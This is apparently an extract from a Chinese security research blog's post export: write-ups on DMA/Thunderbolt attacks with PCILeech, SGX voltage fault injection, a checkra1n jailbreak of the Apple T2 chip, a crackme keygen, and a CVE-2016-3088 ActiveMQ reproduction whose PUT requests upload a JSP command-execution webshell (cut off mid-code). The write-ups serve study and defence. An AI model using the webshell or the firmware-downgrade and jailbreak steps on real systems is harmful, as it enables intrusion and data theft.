允许DMA攻击的设备包括：FireWire、CardBus、ExpressCard、Thunderbolt、PCI和PCI Express 0x01 DMA 是什么 DMA(Direct Memory Access，直接存储器访问) 是所有现代电脑的重要特色，它允许不同速度的硬件装置来沟通，而不需要依赖于 CPU 的大量中断负载。否则，CPU 需要从来源把每一片段的资料复制到暂存器，然后把它们再次写回到新的地方。在这个时间中，CPU 对于其他的工作来说就无法使用。 ​ 正常情况一般只有CPU才能进入主存，现在加了DMA，直接在I/O设备和主存之间打通了一个通路，用来减少CPU的负担。如果出现DMA和CPU同时访存的情况，DMA优先级更高，当两者争抢时CPU是DMA的小弟卧槽 好家伙我TM直接好家伙。 那么CPU和DMA同时访问主存就会出现一下三种情况： ​ 1.CPU停止访问主存 ​ a.CPU放弃地址线的使用权​ b.CPU放弃数据线的使用权​ c.CPU放弃控制线的使用权 优点: 控制简单，它适用于数据传输率很高的设备进行成组传送。 缺点: 在DMA控制器访问内存阶段，内存的效能没有充分发挥，相当一部分内存工作周期是空闲的。这是因为，外围设备传送两个数据之间的间隔一般总是大于内存存储周期，即使高速I/O设备也是如此。例如，软盘读出一个8位二进制数大约需要32us，而半导体内存的存储周期小于0.5us，因此许多空闲的存储周期不能被CPU利用。 ​ 2.周期挪用 ​ DMA请求时，I/O设备挪用或者窃取总线占用权一个或几个主存周期 I/O设备要求DMA传送时可能遇到两种情况： ​ (1)此时CPU不需要访内，如CPU正在执行乘法指令。由于乘法指令执行时间较长，此时I/O访内与CPU访内没有冲突，即I/O设备挪用一二个内存周期对CPU执行程序没有任何影响。 ​ (2)I/O设备要求访内时CPU也要求访内，这就产生了访内冲突，在这种情况下I/O设备访内优先，因为I/O访内有时间要求，前一个I/O数据必须在下一个访问请求到来之前存取完毕。显然，在这种情况下I/O 设备挪用一二个内存周期，意味着CPU延缓了对指令的执行，或者更明确地说，在CPU执行访内指令的过程中插入DMA请求，挪用了一二个内存周期。 与停止CPU访内的DMA方法比较，周期挪用的方法既实现了I/O传送，又较好地发挥了内存和CPU的效率，是一种广泛采用的方法。但是I/O设备每一次周期挪用都有申请总线控制权、建立线控制权和归还总线控制权的过程，所以传送一个字对内存来说要占用一个周期，但对DMA控制器来说一般要2—5个内存周期(视逻辑线路的延迟而定)。因此，周期挪用的方法适用于I/O设备读写周期大于内存存储周期的情况。 3.DMA和CPU交替访问 ​ 适用于CPU的工作周期比主存存取周期长的情况。这样可以将CPU的周期拆分成两部分，前一部分用于DMA访存，后一部分用于CPU访存 ​ 这种传送方式又称为“透明的DMA”方式，其来由是这种DMA传送对CPU来说，如同透明的玻璃一般，没有任何感觉或影响。在透明的DMA方式下工作，CPU既不停止主程序的运行，也不进入等待状态，是一种高效率的工作方式。当然，相应的硬件逻辑也就更加复杂。 0x03 Thunderbolt 3 安全等级无安全性（SL0） 在位于SL0模式时，任何Thunderbolt 3设备连接后将立即开始工作。此模式的危险在于，由于Thunderbolt 3支持PCIe，并且PCIe允许直接访问系统内存，因此恶意的Thunderbolt 3设备可以访问系统内存中的潜在敏感数据，而在SL0模式下，只需要简单的插入设备。 用户授权（SL1）Default 连接Thunderbolt 3设备时，用户必须响应弹出对话框以明确允许连接。用户可以选择允许一次或始终允许该特定设备。这减轻了上述SL0风险。 安全连接（SL2） 与SL1相同，不同之处在于，如果用户选择始终允许特定设备，则系统会向该设备写入加密密钥，并将其记录在其自己的固件中，以执行更强大的“身份验证”使用质询/响应机制在后续连接上对该设备的性能进行评估。这样可以防止攻击者获取已被授予“始终允许”访问权限的外围设备的设备ID并将其克隆到恶意设备上，这在SL1模式下将允许该恶意设备获得“始终允许”访问权限。但是，并非所有的Thunderbolt 3外设都支持SL2。 仅DisplayPort和USB（SL3） 通过Thunderbolt 3允许DisplayPort流量，但不允许PCIe。 如果设置安全模式为SL3，并且连接到实际的Thunderbolt 3扩展坞，则将获得视频输出，但将无法使用通过扩展坞的USB控制器运行的任何USB 3.x端口或其他扩展坞功能。（通常包括所有其他端口，以太网，音频等） Daisy chaining disabled / USB docks only (SL4) SL4 会禁用thunderbolt菊花链，而不是DisplayPort菊花链。 在SL4模式下，允许设备使用PCIe，但仅允许链中的第一个Thunderbolt 3设备。链下游的thunderbolt设备将不允许使用PCIe。 此模式旨在防止恶意的Thunderbolt外围设备通过受信任的设备（例如扩展坞）来访问系统。 内核DMA保护 此模式需要系统固件，操作系统，驱动程序和Thunderbolt 3外围设备的支持。 内核DMA保护使系统仅允许外围设备直接访问系统内存的指定部分，从而降低了风险。 如果系统支持内核DMA保护，但所连接的特定Thunderbolt外围设备不支持它，则该系统将退回到该特定设备连接（通常为SL1） 0x04 攻击方式 对于默认采用了SL1的设备，可以通过其主板上的SPI接口dump出Thunderbolt接口控制的固件，对固件进行修改并写回，以此将SL1降级为SL0。 p.s. 在对设备进行写SPI闪存进行降级的时候，可以将审批闪存设置为只读，这样用户就无法通过BIOS更改 Thunderbolt接口 的安全等级。 降级成功后通过Thunderbolt接口连接被攻击的设备，执行DMA攻击（PCILeech 攻击程序） PCILeech部分功能: 可以通过&gt;150MB/s的速度检索内存 将数据写入目标内存 将活动的RAM挂载位文件 将文件系统挂载为驱动器 在目标系统上执行内核代码 解锁系统 PCILeech攻击使用PCIe硬件设备读取和写入目标系统内存。这是通过在PCIe上使用DMA来实现的。目标系统上不需要驱动程序。 PCILeech还可以在没有硬件的情况下运行，并可以使用LeechCore库支持的多种软件内存获取方法-包括使用DumpIt或WinPmem捕获远程实时内存。PCILeech还支持本地捕获内存和多种内存转储文件格式。 支持多个内存采集器比如： 1.基于USB3380的硬件（基于USB3380的硬件只能本地读取4GB内存，但是如果首先将内核模块(KMD)插入目标系统内核，则可以读取所有内存。）2.基于FPGA 支持的目标系统： 12345UEFILinuxFreeBSDmacOS（不支持macOS High Sierra及更高版本）Windows ​ 这需要有内存（USB3380硬件，FPGA硬件或CVE-2018-1038“ Total Meltdown”）的写访问权。 0x05 安全思考1.设备位于SL1模式下，是否可以 窃取\\克隆 已经获得授权的设备ID，以此获得无提示的设备接入。2.针对上一点作出防御的SL2模式，如果在THunderbolt 3外设不支持SL2的情况下会自动降级到SL1。攻击者完全可以随心所欲降级。SL2如果不是强制实施的话等于无效 0x08 如何缓解BIOS中启用VT-d(IOMMU)防护DMA攻击 0x09 参考链接https://en.wikipedia.org/wiki/DMA_attackhttps://baike.baidu.com/item/DMA/2385376https://github.com/ufrisk/pcileechhttps://www.anquanke.com/post/id/86840https://github.com/LuckyPi/PushPinhttps://www.youtube.com/watch?v=mca3rLsHuTAhttps://zhuanlan.zhihu.com/p/50640466https://docs.microsoft.com/zh-cn/windows/security/information-protection/kernel-dma-protection-for-thunderbolthttps://www.youtube.com/watch?v=7uvSZA1F9oshttps://www.youtube.com/watch?v=oEfzp4lHpB0http://lordcasser.com/2020/07/01/thunderbolt/","link":"/2020/11/28/IOT/DMA%E6%94%BB%E5%87%BB%E5%92%8CThunderbolt-3%E5%AE%89%E5%85%A8%E7%BA%A7%E5%88%AB%E6%B5%85%E8%B0%88/"},{"title":"SGX攻击浅谈","text":"Base-SGX-Attack 0x00 起源研究1.VOLTpwn（software-based）a.介绍 VOLTpwn(CVE-2019-11157)是通过Intel处理器提供的用于控制CPU电压的软件接口MSR（Model Specific Register）0x150 来实现基于电压的故障注入 #目前为止未公布POC代码 a.危害​ 通过恶意软件可以使用此接口将处理器电压降低到一个临界阀值，在该阀值下某些指令将无法正常运行。这意味着攻击者能够在使用这些指令实现的计算机中实现的计算中引起位翻转。因此攻击者能够操纵密码计算，甚至偏离程序的控制流程 b.局限性​ 由于攻击是由软件控制的，因此攻击者不需要物理访问计算机。但是，攻击者需要操作系统特权才能使用电压接口。这意味着该漏洞并不直接威胁普通用户。主要目标是受信任的执行环境，例如intel sgx c.如何修复​ 大部分用户用不到基于软件的电压调节接口，将intel 该接口禁用即可 2.VoltPillager（Hardware-based）a.介绍 在VOLTpwn的基础上，针对intel将基于软件的电压调节禁用以缓解故障注入对SGX的影响，提出了使用硬件手段来进行攻击。 b.影响​ 打破了公认的“SGX可以在硬件计算服务提供商是恶意的情况下保证用户数据和计算过程的安全性”这个前提 0x01 Intel® SGX1.概述 Intel® Software Guard Extensions (Intel® SGX)保护选定的代码和数据不被泄露和修改。开发者可以把应用程序划分到CPU强化的encalve（飞地）中或者内存中可执行的保护区域，即使在受攻击的平台中也能提高安全性。 2.特性a.机密性和完整性​ 即使在OS、BIOS、VMM或者SMM层存在特权恶意软件的情况下也能保证。 b.低学习曲线​ 和父类应用程序蕾丝的OS编程模型，并且在主CPU上执行。 c.远程认证和提供​ 远程部分能够认证一个应用程序enclave的身份，并且安全地将密钥、凭据和敏感数据提供给enclave d.最小可能的攻击面​ CPU边界成为攻击面外围，所有数据、内存、外围之外的I/O都是加密的。 3.解决的问题传统应用程序的的约束​ 开发者长期以来受到主要平台提供商暴露给应用开发的安全能力的限制。黑客也一样熟悉这些功能，他们能够利用弱点来加密敏感数据、凭据或者劫持代码来进行攻击。开发者必须依赖提供商的安全架构，在平台发布之后，他们没有能力设计一个符合他们需求的安全模型。 4.提供新的方法​ Intel设计了一个可能具有最小攻击面的硬件辅助的可信执行环境：CPU边界。Intel SGX提供了17种新的Intel®架构指令，应用程序可以用来为代码和数据设置保留的私有区域，也能够阻止对执行中代码和内存中数据进行的直接攻击。 开发intel SGX保护的应用程序a.组成 不可信代码 可信代码enclave(可以被安全调用) b.运行流程 1.App由可信和不可信部分构成 2.App运行和穿件enclave，enclave放入可信内存中 3.可信函数被调用，执行会转换到enclave中 4.enclave可以访问所有进程数据，外部要访问encalve数据被禁止 5.可信函数返回enclave数据 6.App进行执行不同代码 c.认证enclave和加密数据 intel SGX使用enclave之间本地认证或者第三方认证的方式来保证应用程序没有收到破坏 过程 1.intel SGX通过指令生成CPU和enclave特定的密封密钥 2.应用程序受保护的部分会被加载到一个enclave 3.对应的代码和数据都会受到测量 4.将对应的报告发送给远端应用程序拥有着的服务器上 5.验证这个enclave报告是不是一个可靠的intel处理器生成的 6.验证成功远端信任并安全的提供密钥、凭证和数据 d.可能存在的攻击面 对enclave未授权访问 对enclave内存侦听 5.实现新的安全模型和创新intel SGX使用案例1234567891011121314151617181920212223242526272829保护应用程序和数据 Tamper-resistant code tool vendors保护支付对话以及云和数据安全 Financial services industry (FSI) companies加强生物识别; 强化认证 Security authentication companies强化浏览器体验 Browser vendors强化DRM，增强高清，4K超高清（UHD）内容保护 Content playback ISVs and content owners across over-the-top (OTT) and media services加强终端安全性 Security ISVs and OEMs保护通信-终端到管理控制台 Security ISVs保护电子病历（EMR），敏感和机密数据 Governments and major health care organizations保护本地文件系统上的密钥; 强化磁盘保护 Disk encryption ISVs保护密钥管理，优化嵌入式应用程序 Cloud, infrastructure, and SaaS providers保护TLS密钥库管理 Cloud, content delivery networks, frequency scanning interferometry (FSI), infrastructure, SaaS安全的分析工作负载 Big data ISVs and enterprises安全的文档共享和查看 Government and secure document sharing ISVs飞地优化的嵌入式应用程序 Major defense contractors安全的IoT边界设备和云通信 IoT gateway and device manufacturers 0x02实验准备1.System123456789- 1.Ubuntu 18.04.3 LTS 64-bit- 2.Kernel 5.0.0-23-generic- 3.Intel SGX driver V2.6 - https://github.com/intel/linux-sgx-driver- 4.IntelSGX-SDK V 2.8 - https://github.com/intel/linux-sgx 2.Others1.Teensy 4.0 Development Board（350¥） 2 *Bus Driver，you can choose between the following b.SN74LVC1G07DRLR（7¥） a.NL17SZ07XV5T2G（1-3¥） 3.SOT IC Adapter（172¥） 0x03攻击方式1.选择明文攻击差分攻击获取AES密钥2.延迟写攻击​ 作者发现在拉低电压的情况下会出现写操作延迟，流水线调度出现问题，造成结果错误的问题。 eg：流水线已经执行下一条数据相关的指令但是上段流水的写操作尚未完成，导致计算出错，理论上可以用于绕过密码判断等，也可以造成数据写越界 3.攻击步骤1.找到主板上的SVID和电压调节器(VR) 2.通过tenssy和其他的工具，并接在SVID总线上，以进行指令注入 3.执行基于电压的故障注入攻击 0x04 缓解方式12345678910111213141516171.重新设计协议，增加SVID协议的密码认证2.CPU监视总线上的数据包，检测注入的SVID数据包，如果非自己发出的数据包CPU可能依法异常并中止执行- 攻击者可以在CPU和VR间充当中间人，隐藏恶意的数据包3.检测自身电源电压，如果电压低于以下的值则终止，电压监控电路- 不能依赖基于测量CPU电压的缓解措施，SGX不提供信任的方式来访问MSR，因此此类对策都可以通过有问题的操作系统4.检测在运行内核上的多个关键代码路径- 这种对此对策大量的硬件更改并产生开销5.使用完全集成的稳压器（FIVR）- 第4代Intel Core SoC（已废弃） 0x05参考链接https://www.usenix.org/system/files/sec21summer_chen-zitai.pdf https://zhuanlan.zhihu.com/p/39976702 https://www.youtube.com/watch?v=5Mr1FCZ7VBQ https://github.com/intel/linux-sgx-driver","link":"/2020/12/01/IOT/SGX%E6%94%BB%E5%87%BB%E6%B5%85%E8%B0%88/"},{"title":"Jailbreak_Apple_T2_Chip的相关研究","text":"先放一张图 更新中… 0x00 Apple T2 芯片首先什么是苹果T2芯片呢苹果官网给出的是：Apple T2 安全芯片是 Apple 设计的第二代定制化 Mac 芯片。通过对其他 Mac 电脑中的几款控制器进行重新设计与整合，例如系统管理控制器、图像信号处理器、音频控制器和 SSD 控制器，T2 芯片为 Mac 带来了多项新功能。 例如，T2 芯片让安全性又上新台阶，它所包含的安全隔区协处理器可保护触控 ID 数据，并为新的加密储存和安全启动功能奠定了基础。此外，T2 芯片的图像信号处理器与 FaceTime 高清摄像头配合，进一步提升色调映射和曝光控制，还能基于面部识别技术进行自动曝光并自动调节白平衡。 总结起来就是说是一个值得信赖的安全芯片。T2保护基本功能，例如安全启动，激活锁，Touch ID，加密数据存储，安全启动，图像信号技术等。 Apple T2安全芯片如何工作？Apple T2芯片可以控制MacOS的启动过程。它可以确保用户安装Apple认可的驱动器。只要在Mac计算机上按下电源按钮，它就会开始工作，一直持续到您看到MacOS桌面为止。换句话说，其主要功能之一就是验证Apple是否已签署您的操作系统和引导程序。 T2还负责硬盘驱动器上的所有加密数据。在以前的Mac版本中，此功能由CPU执行，从而使其负担沉重。通过将这些功能转移到T2芯片上，Apple大大改善了新Mac的性能。T2为CPU提供了更多资源。该芯片可确保MacBook Air和MacBook Pro中提供的Touch ID功能。这些设备中的指纹扫描仪为用户提供了快速登录选项，并批准了管理员级别的请求。Apple T2芯片有助于安全地存储指纹数据。 它还处理来自不同应用程序的验证请求。T2芯片可确保没有应用程序可以通过Touch ID或Face访问您的指纹信息。当请求验证时，Apple T2安全芯片将指纹与安全区协处理器中保护的数据进行比较，并通知结果。 0x01 具备Apple T2的设备1234562020 年推出的 iMaciMac Pro2019 年推出的 Mac Pro2018 年推出的 Mac mini2018 年或之后推出的 MacBook Air2018 年或之后推出的 MacBook Pro 可以在“系统信息”里面查看自己的Mac是否配备了T2芯片 在按住 Option 键的同时，选取苹果 () 菜单 &gt;“系统信息”。 对应的Mac的EMC编号如下123456789101112131415161718192021222324iMac Pro：EMC – 3144（型号A1862 – 2017）Mac Pro：EMC – 3203（模型A1991 – 2019）EMC – 3413（A2304型（机架）– 2019年）Mac Mini：EMC – 3213（模型A1993 – 2018）EMC – TBD（TBD型号– 2020）MacBook Pro：EMC – 3214（模型A1989 – 2018）EMC – 3215（型号A1990 – 2018）EMC – 3358（A1989型– 2019年）EMC – 3359（型号A1990 – 2019）EMC – 3301（型号A2159 – 2019）EMC – 3347（型号A2141 – 2019）EMC – 3348（型号A2251 – 2020）EMC – 3456（型号A2289 – 2020）MacBook Air：EMC – 3184（型号A1932 – 2018和2019）EMC – 3302（型号A2179 – 2020） 以下模型容易受到攻击 iBridge产品编号 板号 board minor 说明（产品编号） checkm8 / blackbird确认 iBridge2,1 J137AP 0x0A 苹果T2 iMacPro1,1（j137） 是 iBridge2,3 J680AP 0x0B 苹果T2 MacBookPro15,1（j680） 是 iBridge2,4 J132AP 0x0C 苹果T2 MacBookPro15,2（j132） 是 iBridge2,5 J174AP 0x0E 苹果T2 Macmini8,1（j174） 是 iBridge2,6 J160AP 0x0F 苹果T2 MacPro7,1（j160） 是 iBridge2,7 J780AP 0x07 苹果T2 MacBookPro15,3（j780） 是 iBridge2,8 J140kAP 0x17 苹果T2 MacBookAir8,1（j140k） 是 iBridge2,10 J213AP 0x18 苹果T2 MacBookPro15,4（j213） 是 iBridge2,11 J230AP 0x1F ？ ？ iBridge2,12 J140aAP 0x37 苹果T2 MacBookAir8,2（j140a） 是 iBridge2,13 J214AP 0x1E ？ ？ iBridge2,14 J152fAP 0x3A 苹果T2 MacBookPro16,1（j152f） 是 iBridge2,15 J230kAP 0x3F 苹果T2 MacBookAir9,1（j223k） 是 iBridge2,16 J214kAP 0x3E ？ ？ iBridge2,19 J185AP 0x22 ？ ？ iBridge2,20 J185fAP 0x23 ？ ？ iBridge2,21 J223AP 0x3B ？ ？ iBridge2,22 J215AP 0x38 ？ ？ 0x02 T2芯片的MacOS安全启动过程1234567891011121314151. 即使Mac设备已关闭，T2芯片也已完全启动并保持开启状态。2. 按下电源按钮或打开机盖会触发系统管理控制器（SMC）引导。3. SMC执行加电自检（POST），以检测任何EFI或硬件问题，例如RAM损坏，并可能重定向到Recovery。4. 在进行了基本的健康检查之后，将触发T2芯片并设置I / O连接器。（USB，NVMe，PCIe等），它将使用NVMe和PCIe与NAND存储进行通信。5. 选择适用的启动磁盘，然后询问是否启用了磁盘加密密码以 可能通过FileVault2磁盘加密来挂载 [APFS](https://en.wikipedia.org/wiki/Apple_File_System)卷。6. /System/Library/CoreServices/boot.efi位于系统APFS卷上，并且 [根据您的安全启动设置 ](https://support.apple.com/en-us/HT208330)进行了验证。7. 运行boot.efi来加载Darwin内核（回退到BSD）（如果启动Microsoft Windows，则启动Boot Camp）和IODevice驱动程序。如果在/ System / Library / PrelinkedKernels / prelinkedkernel中找到了内核缓存，它将使用该缓存。8. 如果用户批准的内核扩展已被T2芯片批准，则将其初始化并添加到内核空间。这将随着系统扩展而消失。 0x03 越狱步骤需要设备：1231.一台带有T2芯片的Mac2.另一个MacOS（不知道虚拟机是否可以）；3.USB-C至USB-C电缆。Macbook附带的就可以。 1.从官方网站下载最新版本的Checkra1n T2越狱工具。​ https://checkra.in/releases/ 2.将Mac置于DFU模式。如何进入MacOS DFU模式](https://checkm8.info/blog/dfu-mode-mac) 如何置于DFU模式： 1234561.需要两台电脑2.Apple Configurator 23.usb-c线插到电脑左侧第二个接口4.按住电源按钮1s5.同时按住左control、左option和右shift 持续8s6.Configurator 2显示为DFU模式 检查设备是否已经进入DFU模式 1ioregg -p IOUSB 3.使用CLI，Checkra1n的命令行版本Checkra1n GUI版本0.11.0不支持T2越狱。 如果用Checkra1n工具连接带有T2的Mac，会报以下错误 1Sorry, your device is not supported. 在Finder中打开Checkra1n应用程序，然后右键单击它以查看“显示包装内容”菜单 现在转到文件夹Contents =&gt; MacOS。可以看到Checkra1n二进制文件。打开终端应用程序，然后将二进制文件拖放到&quot;Terminal.&quot; 或者，如果将Checkra1n应用程序放入“应用程序”文件夹，则可以在以下命令中键入以下命令 &quot;Terminal:&quot; 1/Applications/checkra1n.app/Contents/MacOS/checkra1n 4.通过-c来启动命令行版本同时开启 -v 来检查越狱日志 1/Applications/checkra1n.app/Contents/MacOS/checkra1n -c -v 如果报错 1Timed out waiting for bootstrap upload (error code: -20) 在这种情况下，请重新启动Checkra1n CLI工具，直到看到引导程序成功安装的消息： 1: Bootstrap already installed, done 可能需要重试几次才能完成。 5.通过SSH进入越狱的Apple T2芯片成功越狱之后打开一个新的终端窗口，然后输入以下命令： 1iproxy 2222 44 不要关闭此窗口并再打开一个终端窗口(Command + T)。输入此命令： 1ssh root@localhost -p 2222 密码是： alpine 0x04 具体原理 核心问题：T2安全芯片上的SepOS微型操作系统是包含基于IOS A10的处理器，据说A12的芯片似乎解决了这个问题，但是未确认 在Twitter和Reddit上提到由于T2芯片和iPhone及其底层硬件之间共享某些硬件和软件功能。通过结合最初越狱iphone的checkm8 + blackbird两个漏洞便可以越狱T2安全芯片的Mac和Macbook设备 根据 比利时安全公司ironPeak的帖子，越狱T2安全芯片涉及通过USB-C连接到Mac / MacBook，并 在Mac的启动过程中运行Checkra1n越狱软件的0.11.0版本 。 根据ironPeak的说法，这之所以奏效，是因为“ Apple在向客户提供的T2安全芯片中打开调试界面，允许任何人无需身份验证即可进入设备固件更新（DFU）模式。” 使用这种方法，可以创建一条USB-C电缆，该电缆可以在启动时自动利用您的macOS设备。 这使攻击者可以在T2芯片上获得root用户访问权限，并修改和控制目标设备上运行的所有内容，甚至可以恢复加密的数据。 1.Checkm8一句话描述漏洞：对USB请求处理不当造成的UAF漏洞。手里有一个iphone5s，所以决定研究一下checkm8这个漏洞。 上手尝试在分析这个漏洞之前，先对checkm8有一个感性直观的认识，我们首先动动手，做俩实验：分别是使用checkra1n越狱，以及使用ipwndfu提取固化在处理器芯片中的固件代码(SecureROM)。不过在动手之前，先阅读以下写给科技爱好者的文章和广大网友对这个漏洞的讨论： 苹果现史诗级漏洞：iPhone可永久越狱，库克却束手无策！ 有问有答：为什么说这次苹果A系列处理器中的BootROM漏洞是史诗级的？ 如何看待苹果 A5-A11 芯片的「史诗级越狱漏洞」Checkm8？影响有多大？ checkra1n 越狱使用checkra1n，基本就是傻瓜操作。不过与普通越狱不同的是，在使用这个工具越狱后，并不需要安装cydia，即可在爱思助手直接开始ssh通道。ssh通道这个功能是将手机的22端口通过usb映射到电脑主机的端口，第一次用可能会迷糊。默认的用户名密码是：root:alpine，如果不熟悉越狱和ssh流程，可以参考如下文章： IOS 13.3 checkRa1n 越狱 iOS 逆向: 越狱使用 SSH 另外发现ssh虽然开启，也可以由外部连入本机的22端口，但是并不能本机自己连自己，即并不能在手机上安装一个ssh客户端软件来访问自己的shell，这里苹果做了限制，绕过方式是修改ssh服务端口并重启，参考如下： iOS 已越的设备SSH localhost Unable to ssh root@localhost on jailbroken iPad with iOS 8.1 ipwndfu 提取 SecureROM使用ipwndfu完成dump固件。但是其并不是对任何iPhone都支持，在readme中可见支持说明： 12current SoC support: s5l8947x, s5l8950x, s5l8955x, s5l8960x, t8002, t8004, t8010, t8011, t8015future SoC support: s5l8940x, s5l8942x, s5l8945x, s5l8747x, t7000, t7001, s7002, s8000, s8001, s8003, t8012 这些SoC版本对应的苹果设备型号可以参考：https://www.theiphonewiki.com/，可见iPhone5s是s5l8960刚好可以，然后我们将手机置于DFU模式，方法参考 iPhone 进恢复模式和 DFU 模式有什么区别？，iPhone 5s 进入DFU 模式的方法：1、打开iTune2、按住苹果顶部的power键3秒;3、不要松开power键同时按住home键10秒;4、松开power键继续按住home键，一直到iTunes会自动检测到出于恢复模式的iPhone后再松开 安装libusb 1brew install libusb 然后在ipwndfu目录./ipwndfu -p完成后门的植入，如下： 12345╰─$ ./ipwndfu -p 127 ↵*** checkm8 exploit by axi0mX ***Found: CPID:8960 CPRV:11 CPFM:03 SCEP:01 BDID:02 ECID:00000635CB274B30 IBFL:1C SRTG:[iBoot-1704.10]Device is now in pwned DFU Mode.(13.54 seconds) 成功之后即可在电脑的【关于本机】-&gt; 【系统报告】的USB设备详细信息中看到手机的USB序列号已经被更改： 然后dump固件： 12╰─$ sudo ./ipwndfu --dump-romSaved: SecureROM-s5l8960xsi-1704.10-RELEASE.dump 可以与 https://securerom.fun/ 这里下载的固件进行比对，经测试，固件是一致的。 漏洞分析 iPhone史诗级漏洞checkm8攻击原理浅析 Technical analysis of the checkm8 exploit iPhone BootROM 漏洞说明及威胁评估 The One Weird Trick SecureROM Hates iBoot源码泄露事件 这是一切的开始。 让我们来看一条2018年2月8日的新闻：史上最大源码泄露事件：iOS 关键源代码被匿名公布在 GitHub 上，再来看看当时的中国网民怎么说： iOS9源码泄露,是真的么? 如何看待 2018 年 2 月 8 日iBoot源代码泄漏事件？ 可见大部分网民还是吃瓜，因为不懂不了解，也就无法明白这份代码对于理解并破解iPhone的重要性。可以这么说，此次iboot源码的泄露是黑客发现checkm8这个漏洞的起点。但是苹果当时的回应是：iOS 9源代码被泄露 苹果：该源代码已过时 不必担忧。我们事后诸葛亮的来看这个事，可以说是大型打脸现场了，因为泄露的代码至今仍然没有过时。当年苹果公司说他们不在乎，泄露的都是过时的老代码，没有价值，可是他们当时是怎么做的呢？GitHub泄露苹果iBoot源代码？苹果：全网删，谢谢。真的都是江湖人，江湖事呀。那这份泄露的代码在哪呢？虽然在github找到不到了，不过，互联网是有记忆的，网民是万能的： iBoot源代码（含.git目录），来自Github 最近泄露的Apple iBoot/BootROM/Baseband源代码 iBoot IOS 9.3 Leaked Twitter user leaks iOS 9 BootROM and iBoot source code online https://web.archive.org/web/20180208003452/https://github.com/ZioShiba/iBoot 这份泄露的代码主要是iBoot，相当于PC的BIOS层面的代码，不是做底层的程序员一般是看不明白。不过我们大概也猜到了，这些代码主要负责的就是iPhone的启动过程。启动，你会想到什么呢？ iPhone的操作模式刚才的两个小实验中，我们将iPhone经过按键的操作进入了DFU模式，其实iPhone还有一种模式叫恢复模式，这些称之为iPhone的操作模式： iOS DFU和恢复模式的异同之处 iOS取证实战：调查、分析与移动安全：操作模式 其实我们在其他设备上也有类似的操作，比如Android的recovery、fastboot、9008，PC的BIOS配置，Windows的安全模式，Mac的恢复模式等。这些操作都可以理解为进入了一个小系统，这些小系统可能为主系统的运行提供一些必要的支持，也可能作为备用系统以防主系统遭遇不测。我们一般通过在开机过程中按照顺序或者时间的要求按下一些按键，进入这些小系统。换句话说我们没有成功启动主系统，而启动了小系统，对，就是启动。那么这里每一个小系统都有着对应的代码实体，iPhone的DFU和恢复模式的代码实体又在哪呢？是不是iBoot呢？带着这个疑问让我们来看一下，苹果公司泄露的代码能不能回答这个问题。 泄露源码分析打开泄露的源码，大致浏览了一下目录： 12345678910╰─$ tree -N -L 2.├── Makefile├── apps│ ├── EmbeddedIOP│ ├── SecureROM│ └── iBoot├── arch│ ├── arm│ └── arm64 原来泄露的不只有iBoot，还有SecureROM！其实认真看苹果源码泄露事件的国外报道：Breakthrough: iBoot And SecureROM Source Code Has Leaked, Could Lead To Permanent Bootrom iPhone Jailbreak，他们是明确说了iBoot和SecureROM（也就是BootROM）的代码都泄露了，只不过是国内的媒体都只说了iBoot。接下来就是优秀源码阅读时间，不过无论是iBoot还是SecureROM，都是那种天地初开之时的底层代码。对于陌生的代码，可以从代码的运行顺序，目录结构，编译方法，文档说明，对比同类代码，以及他人的分析文章等方面综合理解。 Discussion: iBoot Source Code Leaked 泄露的 iBoot 源代码中都有些什么 如何构建iBoot？ Building iBoot 0x05 调试JTAG相关 iBoot SEPROM dump https://threader.app/thread/1177856941139337216 https://twitter.com/nyan_satan/status/1090989650280398849 YouTube: iPhone 7平台用checkm8漏洞以及Bonobo JTAG电缆和OpenOCD + GDB进行调试 0x06 参考https://checkm8.info/blog/jailbreak-mac-apple-t2-chip https://xuanxuanblingbling.github.io/ios/2020/07/10/checkm8/#https://ironpeak.be/blog/crouching-t2-hidden-danger/","link":"/2020/12/03/IOT/Jailbreak-Apple-T2-Chip%E7%9A%84%E7%9B%B8%E5%85%B3%E7%A0%94%E7%A9%B6/"},{"title":"crackme-系列之-crackme1","text":"首先打开程序进行查看 发现无壳 逻辑分析 账户密码认证 直接仍进去OD进行分析 搜索关键字 在函数⼊⼝处下断点然后运⾏跟踪 输⼊11111 11111 发现关键call 和对比进入分析 ⽤户 11111 堆栈 ss:[0019F664]=0241D6A8, (ASCII “CW-4018-CRACKED”) eax=00000005 输⼊后成功破解 对算法进行相应的破解下断点 输⼊ 11111 22222 发现有两次-的拼接 CW-xxxx-CRACKED 这⾥为取第⼀⼀位 ascii码值的16进制 31 x 0x29 相乘之后为 0x7d9 ⾃身x2 之后转10进制即可 接下来是字符拼接 根据push关系可以推断出此处注册码为： CW-4018-CRACKED ##### 算法脚本如下： 1234c = input(&quot;please input a str\\n&quot;)temp=eval(hex(eval(hex(ord(c[0])))*eval('0x29')*eval('0x2'))) flag = &quot;CW-&quot; + str(temp) + &quot;-CRACKED&quot;print (flag)","link":"/2020/12/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme1/"},{"title":"ActiveMQ漏洞复现分析以及POC(CVE-2016-3088)","text":"影响版本影响版本：Apache ActiveMQ 5.0.0 – 5.13.2ActiveMQ在5.12.x~5.13.x版本中，默认关闭了fileserver这个应用5.14.0版本以后，彻底删除fileserver 环境搭建vulhub拉取漏洞环境docker启动 1docker-compose up -d 漏洞分析ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录,下载 ActiveMQ 5.7.0 源码 ，可以看到后台处理 PUT 的关键代码如下 用户可以上传文件到指定目录，该路径在 conf/jetty.xml 中定义，如下 顺着 PUT 方法追踪，可以看到调用了如下函数 同时看到后台处理 MOVE 的关键代码如下，可以看到该方法没有对目的路径做任何限制或者过滤。 由此，我们可以构造PUT请求上传 webshell 到 fileserver 目录，然后通过 Move 方法将其移动到有执行权限的 admin/ 目录。 利用方法1.上传webshell可以爆破目录(未复现成功) 123456PUT /fileserver/test/123/123 HTTP/1.1Host: 172.20.10.3:8161Content-Length: 4Content-Length: 4test admin 登陆查看目录 首先 PUT 一个 Webshell 的txt到 fileserver 目录 12345678910111213141516PUT /fileserver/1.txt HTTP/1.1Host: 172.20.10.3:8161Content-Length: 330&lt;%@ page import=&quot;java.io.*&quot;%&gt;&lt;% out.print(&quot;Hello&lt;/br&gt;&quot;); String strcmd=request.getParameter(&quot;cmd&quot;); String line=null; Process p=Runtime.getRuntime().exec(strcmd); BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); while((line=br.readLine())!=null){ 